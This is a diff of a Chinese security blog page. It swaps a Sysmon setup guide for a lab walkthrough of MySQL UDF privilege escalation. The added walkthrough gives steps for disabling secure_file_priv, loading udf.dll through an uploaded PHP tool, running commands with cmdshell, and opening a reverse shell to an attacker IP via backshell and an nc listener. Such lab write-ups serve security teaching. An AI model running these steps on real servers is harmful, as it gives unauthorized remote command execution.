@@ -20,24 +20,25 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="描述 编写“Threat Hunt系列”的指导文章主要原因是，安全研究人员在编写渗透测试文章后并没有提供检测技术。渗透测试人员虽然完成了很多出色的工作、描述了对手所使用的工具和技术，但是只有少数人愿意共享出用于检测他们所使用的工具或者编写的代码。 系统监视器（Sysmon）是Windows系统服务和设备驱动程序。应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SH">
+  <meta name="description" content="漏洞描述 声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！ 在渗透或者安全评估时，有可能遇到一些比较奇葩的环境，即使通过Mysql root账号和密码获取了webshell，由于无法执行命令。在一般的情况下，也就放弃了。但其实可以换一种思路，通过mysql查询来直接提权，可以针对以下场景： (1)通过网站无法获取webs">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Sysmon安装与使用">
-<meta property="og:url" content="http://example.com/2021/10/29/Sysmon%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:title" content="MySQL反弹shell提权">
+<meta property="og:url" content="http://example.com/2021/12/10/MySQL%E5%8F%8D%E5%BC%B9shell%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="cat-nineteen">
-<meta property="og:description" content="描述 编写“Threat Hunt系列”的指导文章主要原因是，安全研究人员在编写渗透测试文章后并没有提供检测技术。渗透测试人员虽然完成了很多出色的工作、描述了对手所使用的工具和技术，但是只有少数人愿意共享出用于检测他们所使用的工具或者编写的代码。 系统监视器（Sysmon）是Windows系统服务和设备驱动程序。应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SH">
+<meta property="og:description" content="漏洞描述 声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！ 在渗透或者安全评估时，有可能遇到一些比较奇葩的环境，即使通过Mysql root账号和密码获取了webshell，由于无法执行命令。在一般的情况下，也就放弃了。但其实可以换一种思路，通过mysql查询来直接提权，可以针对以下场景： (1)通过网站无法获取webs">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="d:/long/BOOK/主机安全研究/sysmon使用/sysmon安装与使用.assets/image-20210820095543545.png">
-<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/A73038E4-A59D-47bf-9099-4787C7AF18B4.png">
-<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/2.png">
-<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/34.png">
-<meta property="article:published_time" content="2021-10-29T01:24:02.421Z">
-<meta property="article:modified_time" content="2021-10-30T07:43:51.776Z">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210163300012.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210163734555.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210175946238.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028134405581.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211211101053402.png">
+<meta property="article:published_time" content="2021-12-10T08:29:24.714Z">
+<meta property="article:modified_time" content="2021-12-13T01:43:37.129Z">
 <meta property="article:author" content="longer">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="d:/long/BOOK/主机安全研究/sysmon使用/sysmon安装与使用.assets/image-20210820095543545.png">
+<meta name="twitter:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210163300012.png">
 
-<link rel="canonical" href="http://example.com/2021/10/29/Sysmon%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">
+<link rel="canonical" href="http://example.com/2021/12/10/MySQL%E5%8F%8D%E5%BC%B9shell%E6%8F%90%E6%9D%83/">
 
 
 <script id="page-configurations">
@@ -50,7 +51,7 @@
   };
 </script>
 
-  <title>Sysmon安装与使用 | cat-nineteen</title>
+  <title>MySQL反弹shell提权 | cat-nineteen</title>
   
 
 
@@ -193,7 +194,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/29/Sysmon%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/10/MySQL%E5%8F%8D%E5%BC%B9shell%E6%8F%90%E6%9D%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -206,7 +207,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Sysmon安装与使用
+          MySQL反弹shell提权
         </h1>
 
         <div class="post-meta">
@@ -218,14 +219,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2021-10-29 09:24:02" itemprop="dateCreated datePublished" datetime="2021-10-29T09:24:02+08:00">2021-10-29</time>
+              <time title="创建时间：2021-12-10 16:29:24" itemprop="dateCreated datePublished" datetime="2021-12-10T16:29:24+08:00">2021-12-10</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-30 15:43:51" itemprop="dateModified" datetime="2021-10-30T15:43:51+08:00">2021-10-30</time>
+                <time title="修改时间：2021-12-13 09:43:37" itemprop="dateModified" datetime="2021-12-13T09:43:37+08:00">2021-12-13</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -233,7 +234,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Threat-Hunt/" itemprop="url" rel="index"><span itemprop="name">Threat Hunt</span></a>
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
                 </span>
             </span>
 
@@ -248,27 +249,72 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
-<p>编写“Threat Hunt系列”的指导文章主要原因是，安全研究人员在编写渗透测试文章后并没有提供检测技术。渗透测试人员虽然完成了很多出色的工作、描述了对手所使用的工具和技术，但是只有少数人愿意共享出用于检测他们所使用的工具或者编写的代码。</p>
-<p>系统监视器（Sysmon）是Windows系统服务和设备驱动程序。应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。</p>
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>在渗透或者安全评估时，有可能遇到一些比较奇葩的环境，即使通过Mysql root账号和密码获取了webshell，由于无法执行命令。在一般的情况下，也就放弃了。但其实可以换一种思路，通过mysql查询来直接提权，可以针对以下场景：</p>
+<p>(1)通过网站无法获取webshell</p>
+<p>(2)Webshell无法执行命令</p>
+<p>(3)有phpmyadmin和root账号，无法查询或者无法获取网站的真实路径</p>
+<ul>
+<li>参考：<a target="_blank" rel="noopener" href="https://netsecurity.51cto.com/art/201702/532984.htm">https://netsecurity.51cto.com/art/201702/532984.htm</a></li>
+</ul>
 <hr>
 <span id="more"></span>
 
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载sysmon;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon</span><br></pre></td></tr></table></figure>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p>MySQL</p>
+<hr>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
 
-<p>在sysmon目录下新启cmd并执行；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysmon64.exe -i </span><br></pre></td></tr></table></figure>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li><strong>win 7</strong></li>
+<li><strong>phpstudy2016</strong></li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210163300012.png" alt="image-20211210163300012"></p>
+<ul>
+<li><strong>关闭安全文件特权；</strong></li>
+</ul>
+<p>Mysql数据库从文件导入或导出到文件，提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>
 
-<p><img src="D:\long\BOOK\主机安全研究\sysmon使用\sysmon安装与使用.assets\image-20210820095543545.png" alt="image-20210820095543545"></p>
-<p>​    打开sysmon事件查看：「事件查看器」——「应用程序和服务日志」——「Microsoft」——「Windows」——「Sysmon」文件夹，其中记录了 Sysmon 写入到 Event Log 中的所有事件</p>
-<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysmon -u</span><br></pre></td></tr></table></figure>
+<p>原因及解决方法如下：</p>
+<p>查看配置，执行mysql命令;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
 
-<h2 id="过滤器标签"><a href="#过滤器标签" class="headerlink" title="过滤器标签"></a>过滤器标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ProcessCreate            进程创建</span><br><span class="line">FileCreateTime           文件创建时间更改</span><br><span class="line">NetworkConnect           检测到网络连接</span><br><span class="line">ProcessTerminate         进程终止</span><br><span class="line">DriverLoad               驱动程序已加载</span><br><span class="line">ImageLoad                镜像加载</span><br><span class="line">CreateRemoteThread       已检测到创建远程线程</span><br><span class="line">RawAccessRead            检测到原始访问读取</span><br><span class="line">ProcessAccess            已访问的进程</span><br><span class="line">FileCreate               文件创建</span><br><span class="line">RegistryEvent            添加或删除注册表对象</span><br><span class="line">RegistryEvent            注册表值设置</span><br><span class="line">RegistryEvent            注册表对象已重命名</span><br><span class="line">FileCreateStreamHash     已创建文件流</span><br><span class="line">PipeEvent                管道创建</span><br><span class="line">PipeEvent                管道已连接</span><br><span class="line">WmiEvent                 检测到WmiEventFilter活动 -- WmiEventFilter activity detected</span><br><span class="line">WmiEvent                 检测到WmiEventConsumer活动 -- WmiEventConsumer activity detected</span><br><span class="line">WmiEvent                 检测到WmiEventConsumerToFilter活动 -- WmiEventConsumerToFilter activity </span><br><span class="line">DnsQuery                 DNS查询</span><br></pre></td></tr></table></figure>
+<p>如果value值为null，则为禁止，如果有文件夹目录，则只允许改目录下文件（测试子目录也不行），如果为空，则不限制目录；</p>
+<p>修改mysql配置文件<code>my.ini</code>;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 手动添加一行;</span><br><span class="line">secure_file_priv =</span><br><span class="line"></span><br><span class="line"># 表示限制只允许/home文件夹</span><br><span class="line"># secure_file_priv = /home </span><br><span class="line"></span><br><span class="line"># 表示不限制目录，等号一定要有，否则mysql无法启动</span><br><span class="line"># secure_file_priv = </span><br></pre></td></tr></table></figure>
 
-<h2 id="事件ID"><a href="#事件ID" class="headerlink" title="事件ID"></a>事件ID</h2><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/A73038E4-A59D-47bf-9099-4787C7AF18B4.png" alt="A73038E4-A59D-47bf-9099-4787C7AF18B4"></p>
-<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/2.png" alt="2"></p>
-<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/34.png" alt="34"></p>
+<p>修改完配置文件后，重启mysql即可生效；</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>下载<a target="_blank" rel="noopener" href="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/langouster_udf.zip">langouster_udf.zip</a></p>
+<p>将langouster_udf.php上传至靶机C:\phpStudy\WWW目录下；</p>
+<p>浏览器访问：http://靶机IP/langouster_udf.php</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210163734555.png" alt="image-20211210163734555"></p>
+<p>填入对应的默认账户和密码；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host:靶机IP</span><br><span class="line">mysql账号:root</span><br><span class="line">密码:root</span><br><span class="line">数据库名:mysql</span><br></pre></td></tr></table></figure>
+
+<p>进入后将会是如下页面；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211210175946238.png" alt="image-20211210175946238"></p>
+<p>在导出目录中输入执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\\phpStudy\\MySQL\\lib\\plugin\\udf.dll</span><br></pre></td></tr></table></figure>
+
+<p>在SQL命令中执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION cmdshell RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>操作如下图所示：</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028134405581.png" alt="image-20211028134405581"></p>
+<p><strong>命令执行;</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>反弹shell;</strong></p>
+<p>攻击机中执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+
+<p>在浏览器表单中执行；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br><span class="line">select backshell(&#x27;攻击机IP&#x27;,2333);</span><br></pre></td></tr></table></figure>
+
+<p>攻击机中将会返回shell;</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211211101053402.png" alt="image-20211211101053402"></p>
 
     </div>
 
@@ -303,13 +349,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/10/27/%E6%88%90%E9%83%BDCCS%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A/" rel="prev" title="成都CCS网络安全大会">
-      <i class="fa fa-chevron-left"></i> 成都CCS网络安全大会
+    <a href="/2021/12/08/IIS6.0%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CVE-2017-7269)%20/" rel="prev" title="IIS6.0缓冲区溢出漏洞(CVE-2017-7269)">
+      <i class="fa fa-chevron-left"></i> IIS6.0缓冲区溢出漏洞(CVE-2017-7269)
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2021/10/29/Arpspoof%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" rel="next" title="Arpspoof安装与使用">
-      Arpspoof安装与使用 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -368,7 +411,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">2.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%B8%E8%BD%BD"><span class="nav-number">3.</span> <span class="nav-text">卸载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E6%A0%87%E7%AD%BE"><span class="nav-number">4.</span> <span class="nav-text">过滤器标签</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8B%E4%BB%B6ID"><span class="nav-number">5.</span> <span class="nav-text">事件ID</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FOFA%E8%AF%AD%E5%8F%A5"><span class="nav-number">3.</span> <span class="nav-text">FOFA语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">4.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">漏洞复现</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
